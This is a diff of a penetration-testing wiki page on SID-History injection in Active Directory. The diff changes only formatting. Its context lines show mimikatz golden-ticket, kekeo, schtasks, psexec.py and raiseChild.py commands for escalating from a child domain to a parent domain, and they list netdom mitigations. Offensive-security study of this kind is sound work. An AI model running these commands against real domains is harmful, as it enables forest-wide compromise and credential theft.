@@ -1,6 +1,6 @@
 # SID-History Injection
 
-{{#include ../../banners/hacktricks-training.md}}
+\{{#include ../../banners/hacktricks-training.md\}}
 
 ## SID History Injection Attack
 
@@ -18,14 +18,14 @@ Another way yo find the SID of a group of the other domain (for example "Domain 
 Get-DomainGroup -Identity "Domain Admins" -Domain parent.io -Properties ObjectSid
 ```
 
-
-> [!WARNING]
+> \[!WARNING]\
 > Note that it's possible to disable SID history in a trust relationship which will make this attack fail.
 
 According to the [**docs**](https://technet.microsoft.com/library/cc835085.aspx):
-- **Disabling SIDHistory on forest trusts** using the netdom tool (`netdom trust /domain: /EnableSIDHistory:no on the domain controller`)
-- **Applying SID Filter Quarantining to external trusts** using the netdom tool (`netdom trust /domain: /quarantine:yes on the domain controller`)
-- **Applying SID Filtering to domain trusts within a single forest** is not recommended as it is an unsupported configuration and can cause breaking changes. If a domain within a forest is untrustworthy then it should not be a member of the forest. In this situation it is necessary to first split the trusted and untrusted domains into separate forests where SID Filtering can be applied to an interforest trust
+
+* **Disabling SIDHistory on forest trusts** using the netdom tool (`netdom trust /domain: /EnableSIDHistory:no on the domain controller`)
+* **Applying SID Filter Quarantining to external trusts** using the netdom tool (`netdom trust /domain: /quarantine:yes on the domain controller`)
+* **Applying SID Filtering to domain trusts within a single forest** is not recommended as it is an unsupported configuration and can cause breaking changes. If a domain within a forest is untrustworthy then it should not be a member of the forest. In this situation it is necessary to first split the trusted and untrusted domains into separate forests where SID Filtering can be applied to an interforest trust
 
 Check this post for more information about bypassing this: [**https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4**](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4)
 
@@ -70,16 +70,15 @@ mimikatz.exe "kerberos::golden /user:Administrator /domain:<current_domain> /sid
 
 For more info about golden tickets check:
 
-{{#ref}}
-golden-ticket.md
-{{#endref}}
-
+\{{#ref\}}\
+golden-ticket.md\
+\{{#endref\}}
 
 For more info about diamond tickets check:
 
-{{#ref}}
-diamond-ticket.md
-{{#endref}}
+\{{#ref\}}\
+diamond-ticket.md\
+\{{#endref\}}
 
 ```bash
 .\asktgs.exe C:\AD\Tools\kekeo_old\trust_tkt.kirbi CIFS/mcorp-dc.moneycorp.local
@@ -103,9 +102,9 @@ schtasks /Run /S mcorp-dc.moneycorp.local /TN "STCheck114"
 
 With the acquired permissions from the attack you can execute for example a DCSync attack in the new domain:
 
-{{#ref}}
-dcsync.md
-{{#endref}}
+\{{#ref\}}\
+dcsync.md\
+\{{#endref\}}
 
 ### From linux
 
@@ -135,17 +134,17 @@ psexec.py <child_domain>/Administrator@dc.root.local -k -no-pass -target-ip 10.1
 
 This is an Impacket script which will **automate escalating from child to parent domain**. The script needs:
 
-- Target domain controller
-- Creds for an admin user in the child domain
+* Target domain controller
+* Creds for an admin user in the child domain
 
 The flow is:
 
-- Obtains the SID for the Enterprise Admins group of the parent domain
-- Retrieves the hash for the KRBTGT account in the child domain
-- Creates a Golden Ticket
-- Logs into the parent domain
-- Retrieves credentials for the Administrator account in the parent domain
-- If the `target-exec` switch is specified, it authenticates to the parent domain's Domain Controller via Psexec.
+* Obtains the SID for the Enterprise Admins group of the parent domain
+* Retrieves the hash for the KRBTGT account in the child domain
+* Creates a Golden Ticket
+* Logs into the parent domain
+* Retrieves credentials for the Administrator account in the parent domain
+* If the `target-exec` switch is specified, it authenticates to the parent domain's Domain Controller via Psexec.
 
 ```bash
 raiseChild.py -target-exec 10.10.10.10 <child_domain>/username
@@ -153,10 +152,7 @@ raiseChild.py -target-exec 10.10.10.10 <child_domain>/username
 
 ## References
 
-- [https://adsecurity.org/?p=1772](https://adsecurity.org/?p=1772)
-- [https://www.sentinelone.com/blog/windows-sid-history-injection-exposure-blog/](https://www.sentinelone.com/blog/windows-sid-history-injection-exposure-blog/)
+* [https://adsecurity.org/?p=1772](https://adsecurity.org/?p=1772)
+* [https://www.sentinelone.com/blog/windows-sid-history-injection-exposure-blog/](https://www.sentinelone.com/blog/windows-sid-history-injection-exposure-blog/)
 
-{{#include ../../banners/hacktricks-training.md}}
-
-
-
+\{{#include ../../banners/hacktricks-training.md\}}
